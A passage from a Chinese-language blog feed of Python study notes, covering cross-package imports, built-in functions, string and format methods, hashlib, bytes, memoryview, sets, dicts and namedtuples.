title="导入跨包下级模块"></a>导入跨包下级模块</h2><p><code>module_11.py</code>导入<code>package2</code>包的<code>module_21.py</code>模块</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-keyword">import</span> sys<br>sys.<span class="hljs-built_in">path</span>.append(<span class="hljs-string">&quot;..&quot;</span>)<br>from package2 <span class="hljs-keyword">import</span> module_21<br></code></pre></td></tr></table></figure><p>相当于通过<code>sys.path.append(&quot;..&quot;)</code>进入上级目录，然后类似导入<code>下级目录</code>模块的方式导入。</p><blockquote><p>参考：<a href="https://www.huweihuang.com/python-notes/package/package-module.html">https://www.huweihuang.com/python-notes/package/package-module.html</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python-useful-skills</title>
    <link href="/2020/11/10/python-useful-skills_new/"/>
    <url>/2020/11/10/python-useful-skills_new/</url>
    
    <content type="html"><![CDATA[<p>一些好用的 python 内置属性、函数、技巧。</p><a id="more"></a><h1 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h1><table><thead><tr><th>Built-in Functions</th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td><a href="https://docs.python.org/3/library/functions.html#abs"><code>abs()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#func-dict"><code>dict()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#help"><code>help()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#min"><code>min()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#setattr"><code>setattr()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#all"><code>all()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#dir"><code>dir()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#hex"><code>hex()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#next"><code>next()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#slice"><code>slice()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#any"><code>any()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#divmod"><code>divmod()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#id"><code>id()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#object"><code>object()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#sorted"><code>sorted()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#ascii"><code>ascii()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#enumerate"><code>enumerate()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#input"><code>input()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#oct"><code>oct()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#staticmethod"><code>staticmethod()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#bin"><code>bin()</code></a></td><td><code>[eval()](https://docs.python.org/3/library/functions.html#eval)--执行字符串命令</code></td><td><a href="https://docs.python.org/3/library/functions.html#int"><code>int()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#open"><code>open()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#func-str"><code>str()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#bool"><code>bool()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#exec"><code>exec()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#isinstance"><code>isinstance()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#ord"><code>ord()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#sum"><code>sum()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#func-bytearray"><code>bytearray()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#filter"><code>filter()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#issubclass"><code>issubclass()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#pow"><code>pow()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#super"><code>super()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#func-bytes"><code>bytes()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#float"><code>float()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#iter"><code>iter()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#print"><code>print()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#func-tuple"><code>tuple()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#callable"><code>callable()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#format"><code>format()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#len"><code>len()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#property"><code>property()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#type"><code>type()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#chr"><code>chr()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#func-frozenset"><code>frozenset()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#func-list"><code>list()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#func-range"><code>range()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#vars"><code>vars()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#classmethod"><code>classmethod()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#getattr"><code>getattr()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#locals"><code>locals()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#repr"><code>repr()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#zip"><code>zip()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#compile"><code>compile()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#globals"><code>globals()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#map"><code>map()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#reversed"><code>reversed()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#__import__"><code>__import__()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#complex"><code>complex()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#hasattr"><code>hasattr()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#max"><code>max()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#round"><code>round()</code></a></td><td></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#delattr"><code>delattr()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#hash"><code>hash()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#func-memoryview"><code>memoryview()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#func-set"><code>set()</code></a></td><td></td></tr></tbody></table><h1 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h1><h2 id="字符串常量"><a href="#字符串常量" class="headerlink" title="字符串常量"></a>字符串常量</h2><p><code>string.ascii_letters</code></p><blockquote><p>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ</p></blockquote><p><code>string.ascii_lowercase</code></p><blockquote><p>abcdefghijklmnopqrstuvwxyz</p></blockquote><p><code>string.digits</code></p><blockquote><p>0123456789</p></blockquote><p><code>string.punctuation</code></p><blockquote><p>!”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~</p></blockquote><p><code>string.whitespace</code></p><blockquote><p>\t\n\r\x0b\x0c</p></blockquote><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#123;0&#125;&#123;1&#125;&#123;0&#125;&#x27;</span>.format(<span class="hljs-string">&#x27;abra&#x27;</span>, <span class="hljs-string">&#x27;cad&#x27;</span>)   <span class="hljs-comment"># arguments&#x27; indices can be repeated</span><br><span class="hljs-string">&#x27;abracadabra&#x27;</span><br><br><span class="hljs-comment">#按名称访问参数:</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;Coordinates: &#123;latitude&#125;, &#123;longitude&#125;&#x27;</span>.format(latitude=<span class="hljs-string">&#x27;37.24N&#x27;</span>, longitude=<span class="hljs-string">&#x27;-115.81W&#x27;</span>)<br><span class="hljs-string">&#x27;Coordinates: 37.24N, -115.81W&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>coord = &#123;<span class="hljs-string">&#x27;latitude&#x27;</span>: <span class="hljs-string">&#x27;37.24N&#x27;</span>, <span class="hljs-string">&#x27;longitude&#x27;</span>: <span class="hljs-string">&#x27;-115.81W&#x27;</span>&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;Coordinates: &#123;latitude&#125;, &#123;longitude&#125;&#x27;</span>.format(**coord)<br><span class="hljs-string">&#x27;Coordinates: 37.24N, -115.81W&#x27;</span><br><br><span class="hljs-comment">#对齐文本以及指定宽度:</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#123;:&lt;30&#125;&#x27;</span>.format(<span class="hljs-string">&#x27;left aligned&#x27;</span>)<br><span class="hljs-string">&#x27;left aligned                  &#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#123;:&gt;30&#125;&#x27;</span>.format(<span class="hljs-string">&#x27;right aligned&#x27;</span>)<br><span class="hljs-string">&#x27;                 right aligned&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#123;:^30&#125;&#x27;</span>.format(<span class="hljs-string">&#x27;centered&#x27;</span>)<br><span class="hljs-string">&#x27;           centered           &#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#123;:*^30&#125;&#x27;</span>.format(<span class="hljs-string">&#x27;centered&#x27;</span>)  <span class="hljs-comment"># use &#x27;*&#x27; as a fill char</span><br><span class="hljs-string">&#x27;***********centered***********&#x27;</span><br><span class="hljs-comment">####################</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>width = <span class="hljs-number">5</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>,<span class="hljs-number">12</span>):<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">for</span> base <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;dXob&#x27;</span>:<br><span class="hljs-meta">... </span>        print(<span class="hljs-string">&#x27;&#123;0:&#123;width&#125;&#123;base&#125;&#125;&#x27;</span>.format(num, base=base, width=width), end=<span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-meta">... </span>    print()<br>...<br>    <span class="hljs-number">5</span>     <span class="hljs-number">5</span>     <span class="hljs-number">5</span>   <span class="hljs-number">101</span><br>    <span class="hljs-number">6</span>     <span class="hljs-number">6</span>     <span class="hljs-number">6</span>   <span class="hljs-number">110</span><br>    <span class="hljs-number">7</span>     <span class="hljs-number">7</span>     <span class="hljs-number">7</span>   <span class="hljs-number">111</span><br>    <span class="hljs-number">8</span>     <span class="hljs-number">8</span>    <span class="hljs-number">10</span>  <span class="hljs-number">1000</span><br>    <span class="hljs-number">9</span>     <span class="hljs-number">9</span>    <span class="hljs-number">11</span>  <span class="hljs-number">1001</span><br>   <span class="hljs-number">10</span>     A    <span class="hljs-number">12</span>  <span class="hljs-number">1010</span><br>   <span class="hljs-number">11</span>     B    <span class="hljs-number">13</span>  <span class="hljs-number">1011</span><br></code></pre></td></tr></table></figure><h2 id="内置函数-1"><a href="#内置函数-1" class="headerlink" title="内置函数"></a>内置函数</h2><ol><li><code>str.encode(encoding=&quot;utf-8&quot;, errors=&quot;strict&quot;)</code></li><li><code>str.find(sub[, start[, end]])</code></li></ol><p>返回子字符串  <em>sub</em>  在  <code>s[start:end]</code>  切片内被找到的最小索引。 可选参数  <em>start</em>  与  <em>end</em>  会被解读为切片表示法。 如果  <em>sub</em>  未被找到则返回  <code>-1</code>。</p><ol start="3"><li><code>str.isalnum``()</code></li></ol><p>如果字符串中的所有字符都是字母或数字且至少有一个字符，则返回  <code>True</code> ， 否则返回  <code>False</code> 。 如果  <code>c.isalpha()</code> ， <code>c.isdecimal()</code> ， <code>c.isdigit()</code> ，或  <code>c.isnumeric()</code>  之中有一个返回  <code>True</code> ，则字符<code>c</code>是字母或数字。</p><ol start="4"><li><code>str.isalpha()</code></li></ol><p>如果字符串中的所有字符都是字母，并且至少有一个字符，返回 <code>True</code> ，否则返回 <code>False</code> 。字母字符是指那些在 Unicode 字符数据库中定义为 “Letter” 的字符，即那些具有 “Lm”、”Lt”、”Lu”、”Ll” 或 “Lo” 之一的通用类别属性的字符。 注意，这与 Unicode 标准中定义的”字母”属性不同。</p><ol start="5"><li><code>str.isascii()</code></li></ol><p>如果字符串为空或字符串中的所有字符都是 ASCII ，返回 <code>True</code> ，否则返回 <code>False</code> 。ASCII 字符的码点范围是 U+0000-U+007F 。<br>_</p><ol start="6"><li><code>str.isdecimal()</code></li></ol><p>如果字符串中的所有字符都是十进制字符且该字符串至少有一个字符，则返回 <code>True</code> ， 否则返回 <code>False</code> 。十进制字符指那些可以用来组成 10 进制数字的字符，例如 U+0660 ，即阿拉伯字母数字 0 。 严格地讲，十进制字符是 Unicode 通用类别 “Nd” 中的一个字符。</p><ol start="7"><li><code>str.isdigit()</code></li></ol><p>如果字符串中的所有字符都是数字，并且至少有一个字符，返回 <code>True</code> ，否则返回 <code>False</code> 。 数字包括十进制字符和需要特殊处理的数字，如兼容性上标数字。这包括了不能用来组成 10 进制数的数字，如 Kharosthi 数。 严格地讲，数字是指属性值为 Numeric_Type=Digit 或 Numeric_Type=Decimal 的字符。</p><ol start="8"><li><code>str.isspace()</code></li></ol><p>如果字符串中只有空白字符且至少有一个字符则返回 <code>True</code> ，否则返回 <code>False</code> 。</p><ol start="9"><li><code>str.join(iterable)</code></li></ol><p>返回一个由 <em>iterable</em> 中的字符串拼接而成的字符串。 如果 <em>iterable</em> 中存在任何非字符串值包括 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytes"><code>bytes</code></a> 对象则会引发 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#TypeError"><code>TypeError</code></a>。 调用该方法的字符串将作为元素之间的分隔。</p><ol start="10"><li><code>str.replace(old, new[, count])</code></li></ol><p>返回字符串的副本，其中出现的所有子字符串 <em>old</em> 都将被替换为 <em>new_。 如果给出了可选参数 _count_，则只替换前 _count</em> 次出现。</p><ol start="11"><li><code>str.rsplit(sep=None, maxsplit=-1)</code></li></ol><p>返回一个由字符串内单词组成的列表，使用 <em>sep</em> 作为分隔字符串。 如果给出了 <em>maxsplit_，则最多进行 _maxsplit</em> 次拆分，从 <em>最右边</em> 开始。 如果 <em>sep</em> 未指定或为 <code>None</code>，任何空白字符串都会被作为分隔符。 除了从右边开始拆分，<a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#str.rsplit"><code>rsplit()</code></a> 的其他行为都类似于下文所述的 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#str.split"><code>split()</code></a>。</p><ol start="12"><li><code>str.translate(table)</code></li></ol><p>返回原字符串的副本，其中每个字符按给定的转换表进行映射。 转换表必须是一个使用 <a href="https://docs.python.org/zh-cn/3/reference/datamodel.html#object.__getitem__"><code>__getitem__()</code></a> 来实现索引操作的对象，通常为 <a href="https://docs.python.org/zh-cn/3/glossary.html#term-mapping">mapping</a> 或 <a href="https://docs.python.org/zh-cn/3/glossary.html#term-sequence">sequence</a>。 当以 Unicode 码位序号（整数）为索引时，转换表对象可以做以下任何一种操作：返回 Unicode 序号或字符串，将字符映射为一个或多个字符；返回 <code>None</code>，将字符从结果字符串中删除；或引发 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#LookupError"><code>LookupError</code></a> 异常，将字符映射为其自身。<br>你可以使用 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#str.maketrans"><code>str.maketrans()</code></a> 基于不同格式的字符到字符映射来创建一个转换映射表。</p><h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><h2 id="hashlib-模块"><a href="#hashlib-模块" class="headerlink" title="hashlib 模块"></a>hashlib 模块</h2><p>可用的哈希算法构造器有  <code>sha1()</code>,<code> sha224()</code>, <code>sha256()</code>, <code>sha384()</code>, <code>sha512()</code>, <a href="https://docs.python.org/zh-cn/3/library/hashlib.html#hashlib.blake2b"><code>blake2b()</code></a>和  <a href="https://docs.python.org/zh-cn/3/library/hashlib.html#hashlib.blake2s"><code>blake2s()</code></a>、<code>md5()</code>通常也是可用的。<br>具体清单如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<span class="hljs-string">&#x27;blake2b&#x27;</span>,<br> <span class="hljs-string">&#x27;blake2s&#x27;</span>,<br> <span class="hljs-string">&#x27;md5&#x27;</span>,<br> <span class="hljs-string">&#x27;sha1&#x27;</span>,<br> <span class="hljs-string">&#x27;sha224&#x27;</span>,<br> <span class="hljs-string">&#x27;sha256&#x27;</span>,<br> <span class="hljs-string">&#x27;sha384&#x27;</span>,<br> <span class="hljs-string">&#x27;sha3_224&#x27;</span>,<br> <span class="hljs-string">&#x27;sha3_256&#x27;</span>,<br> <span class="hljs-string">&#x27;sha3_384&#x27;</span>,<br> <span class="hljs-string">&#x27;sha3_512&#x27;</span>,<br> <span class="hljs-string">&#x27;sha512&#x27;</span>,<br> <span class="hljs-string">&#x27;shake_128&#x27;</span>,<br> <span class="hljs-string">&#x27;shake_256&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>用法示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">hashlib.sha224(<span class="hljs-string">b&quot;Nobody inspects the spammish repetition&quot;</span>).hexdigest()<br><span class="hljs-comment">#&#x27;a4337bc45a8fc544c03f52dc550cd6e1e87021bc896588bd79e901e2&#x27;</span><br><br>In []: hashlib.md5(<span class="hljs-string">b&#x27;1111&#x27;</span>).hexdigest()<br>Out[]: <span class="hljs-string">&#x27;b59c67bf196a4758191e42f76670ceba&#x27;</span><br></code></pre></td></tr></table></figure><p>详细用法可参考：<a href="https://docs.python.org/zh-cn/3/library/hashlib.html">https://docs.python.org/zh-cn/3/library/hashlib.html</a></p><h1 id="二进制操作"><a href="#二进制操作" class="headerlink" title="二进制操作"></a>二进制操作</h1><p>操作二进制数据的核心内置类型是  <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytes"><code>bytes</code></a>  和  <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytearray"><code>bytearray</code></a>。<br>bytes 对象是由整数构成的序列（类似于元组），但其实操作仍然类似于字符串，上面提到的函数在 byte 中仍然适用。<br>bytearray 对象是可变的，该对象除了  <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytes-methods">bytes 和 bytearray 操作</a>  中所描述的 bytes 和 bytearray 共有操作之外，还支持  <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#typesseq-mutable">可变</a>  序列操作。</p><h1 id="内存视图"><a href="#内存视图" class="headerlink" title="内存视图"></a>内存视图</h1><p><a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#memoryview"><code>memoryview</code></a>  对象允许 Python 代码访问一个对象的内部数据</p><p>创建一个引用  <em>obj</em>  的  <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#memoryview"><code>memoryview</code></a>。 <em>obj</em>  必须支持缓冲区协议。 支持缓冲区协议的内置对象包括  <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytes"><code>bytes</code></a>  和  <code>[bytearray](https://docs.python.org/zh-cn/3/library/stdtypes.html#bytearray)</code>，<code>array</code>。</p><p><a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#memoryview"><code>memoryview</code></a>  具有  <em>元素</em>  的概念，即由原始对象  <em>obj</em>  所处理的基本内存单元。 对于许多简单类型例如  <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytes"><code>bytes</code></a>  和  <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytearray"><code>bytearray</code></a>  来说，一个元素就是一个字节，但是其他的类型例如  <a href="https://docs.python.org/zh-cn/3/library/array.html#array.array"><code>array.array</code></a>  可能有更大的元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>v = memoryview(<span class="hljs-string">b&#x27;abcefg&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>v[<span class="hljs-number">1</span>]<br><span class="hljs-number">98</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bytes(v[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>])<br><span class="hljs-string">b&#x27;bce&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="set-集合"><a href="#set-集合" class="headerlink" title="set 集合"></a>set 集合</h1><p><em>set</em>  对象是由具有唯一性的  <a href="https://docs.python.org/zh-cn/3/glossary.html#term-hashable">hashable</a>  对象所组成的无序多项集。 常见的用途包括成员检测、从序列中去除重复项以及数学中的集合类计算，例如<strong>交集、并集、差集与对称差集</strong>等等。</p><p>作为一种无序的多项集，集合并不记录元素位置或插入顺序。 相应地，集合<strong>不支持索引、切片或其他序列类的操作</strong>。</p><p><a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#set"><code>set</code></a>  类型是可变的 — 其内容可以使用  <code>add()</code>  和  <code>remove()</code>  这样的方法来改变。 由于是可变类型，它没有哈希值，且不能被用作字典的键或其他集合的元素。 <br>集合可用多种方式来创建:</p><ul><li><p>使用花括号内以逗号分隔元素的方式: <code>&#123;&#39;jack&#39;, &#39;sjoerd&#39;&#125;</code></p></li><li><p>使用集合推导式: <code>&#123;c for c in &#39;abracadabra&#39; if c not in &#39;abc&#39;&#125;</code></p></li><li><p>使用类型构造器: <code>set()</code>, <code>set(&#39;foobar&#39;)</code>, <code>set([&#39;a&#39;, &#39;b&#39;, &#39;foo&#39;])</code></p></li><li><p><code>isdisjoint</code>(<em>other</em>)</p></li></ul><p>如果集合中没有与 <em>other</em> 共有的元素则返回 <code>True</code>。 当且仅当两个集合的交集为空集合时，两者为不相交集合。</p><ul><li><code>issubset</code>(<em>other</em>)<code>set &lt;= other</code></li></ul><p>检测是否集合中的每个元素都在 <em>other</em> 之中。</p><ul><li><code>set &lt; other</code></li></ul><p>检测集合是否为 <em>other</em> 的真子集，即 <code>set &lt;= other and set != other</code>。</p><ul><li><code>issuperset</code>(<em>other</em>)<code>set &gt;= other</code></li></ul><p>检测是否 <em>other</em> 中的每个元素都在集合之中。</p><ul><li><code>set &gt; other</code></li></ul><p>检测集合是否为 <em>other</em> 的真超集，即 <code>set &gt;= other and set != other</code>。</p><ul><li><code>intersection</code>(<em>*others</em>)</li></ul><p><code>set &amp; other &amp; ...</code><br>返回一个新集合，其中包含原集合以及 others 指定的所有集合中共有的元素。</p><ul><li><code>difference</code>(<em>*others</em>)<code>set - other - ...</code></li></ul><p>返回一个新集合，其中包含原集合中在 others 指定的其他集合中不存在的元素。</p><ul><li><code>symmetric_difference</code>(<em>other</em>)<code>set ^ other</code></li></ul><p>返回一个新集合，其中的元素或属于原集合或属于 <em>other</em> 指定的其他集合，但不能同时属于两者。</p><ul><li><code>update</code>(<em>*others</em>)<code>set |= other | ...</code></li></ul><p>更新集合，添加来自 others 中的所有元素。</p><ul><li><code>intersection_update</code>(<em>*others</em>)<code>set &amp;= other &amp; ...</code></li></ul><p>更新集合，只保留其中在所有 others 中也存在的元素。</p><ul><li><code>difference_update</code>(<em>*others</em>)<code>set -= other | ...</code></li></ul><p>更新集合，移除其中也存在于 others 中的元素。</p><ul><li><code>symmetric_difference_update</code>(<em>other</em>)<code>set ^= other</code></li></ul><p>更新集合，只保留存在于集合的一方而非共同存在的元素。</p><ul><li><code>add</code>(<em>elem</em>)<a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#frozenset.add">¶</a></li></ul><p>将元素 <em>elem</em> 添加到集合中。</p><ul><li><code>remove</code>(<em>elem</em>)</li></ul><p>从集合中移除元素 <em>elem_。 如果 _elem</em> 不存在于集合中则会引发 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#KeyError"><code>KeyError</code></a>。</p><ul><li><code>discard</code>(<em>elem</em>)</li></ul><p>如果元素 <em>elem</em> 存在于集合中则将其移除。</p><ul><li><code>pop</code>()</li></ul><p>从集合中移除并返回任意一个元素。 如果集合为空则会引发 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#KeyError"><code>KeyError</code></a>。</p><h1 id="字典-dict"><a href="#字典-dict" class="headerlink" title="字典 dict"></a>字典 dict</h1><p>字典取值常常直接 d[j]了，但是有可能报错，这里有一种更保险的取值方式–<br><code>get</code>(<em>key</em>[, <em>default</em>])<br>如果 <em>key</em> 存在于字典中则返回 <em>key</em> 的值，否则返回 <em>default_。 如果 _default</em> 未给出则默认为 <code>None</code>，因而此方法绝不会引发 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#KeyError"><code>KeyError</code></a>。</p><p>其他操作：</p><ul><li><code>reversed(d)</code></li></ul><p>返回一个逆序获取字典键的迭代器。 这是 <code>reversed(d.keys())</code> 的快捷方式。</p><ul><li><code>setdefault</code>(<em>key</em>[, <em>default</em>])</li></ul><p>如果字典存在键 <em>key</em> ，返回它的值。如果不存在，插入值为 <em>default</em> 的键 <em>key</em> ，并返回 <em>default</em> 。 <em>default</em> 默认为 <code>None</code>。</p><ul><li><code>values</code>()</li></ul><p>返回由字典值组成的一个新视图。</p><ul><li><code>keys</code>()</li></ul><p>返回由字典键组成的一个新视图。</p><p><code>iter(dictview)</code><br>返回字典中的键、值或项（以 <code>(键, 值)</code> 为元素的元组表示）的迭代器。<br>键和值是按插入时的顺序进行迭代的。 这样就允许使用 <a href="https://docs.python.org/zh-cn/3/library/functions.html#zip"><code>zip()</code></a> 来创建 <code>(值, 键)</code> 对: <code>pairs = zip(d.values(), d.keys())</code>。 另一个创建相同列表的方式是 <code>pairs = [(v, k) for (k, v) in d.items()]</code>.</p><h1 id="tuple-元组"><a href="#tuple-元组" class="headerlink" title="tuple-元组"></a>tuple-元组</h1><p>元组是：</p><ul><li>不可变</li><li>有序</li><li>异质</li><li>索引（从零开始）</li><li>带圆括号（可选，但建议）</li><li>在迭代过程中更快，因为它是不可变的</li></ul><p>元组<strong>对于创建</strong>通常包含相关信息（例如员工信息）的<strong>对象</strong>很有用。换句话说，元组可以让我们将相关信息“块”在一起，并将其用作单个事物。</p><h2 id="访问元素"><a href="#访问元素" class="headerlink" title="访问元素"></a>访问元素</h2><ul><li><strong>正索引</strong>从元组的开始开始计数。</li><li><strong>负索引</strong>从元组的末尾开始计数。</li><li>一定<strong>范围的索引</strong>将使用指定的项目创建一个新的元组（称为<strong>Slicing</strong>）。</li><li>范围[m:n]是指从位置 m（_含_）到位置 n（_不含_）。</li><li>使用<strong>双索引</strong>访问嵌套元组的元素。</li></ul><h2 id="创建键值对（命名）元组"><a href="#创建键值对（命名）元组" class="headerlink" title="创建键值对（命名）元组"></a>创建键值对（命名）元组</h2><p>命名元组示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> collections<br>Record = collections.namedtuple(<span class="hljs-string">&#x27;Record&#x27;</span>, [<span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;date&#x27;</span>])<br>R1 = Record(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;My Record&#x27;</span>, <span class="hljs-string">&#x27;12/12/2020&#x27;</span>)<br><span class="hljs-comment">#Accessing using index</span><br>print(<span class="hljs-string">&quot;Record id is:&quot;</span>, R1[<span class="hljs-number">0</span>]) <span class="hljs-comment"># Record id is: 1</span><br><span class="hljs-comment"># Accessing using key</span><br>print(<span 